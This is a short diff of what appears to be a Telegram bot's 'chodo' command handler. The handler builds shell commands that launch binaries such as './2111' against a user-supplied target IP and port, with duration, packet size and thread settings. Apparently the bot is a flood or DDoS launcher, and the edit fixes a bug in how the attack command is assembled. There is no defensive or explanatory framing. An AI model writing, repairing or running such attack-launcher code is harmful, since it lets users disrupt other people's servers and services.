@@ -676,7 +676,7 @@ async def chodo(update: Update, context: CallbackContext):
     elif argument_type == 4:
         chodo_command = f"./2111 {ip} {port} {duration} {threads}"
     elif argument_type == 5:
-        chodo_command = f"./2111 {ip} {port} {duration} {byte_size} {threads}", "./ranbal {ip} {port} {duration} {byte_size} {threads}"
+        chodo_command = f"./2111 {ip} {port} {duration} {byte_size} {threads}"
 
     # Send chodo details to the user
     await context.bot.send_message(chat_id=chat_id, text=( 
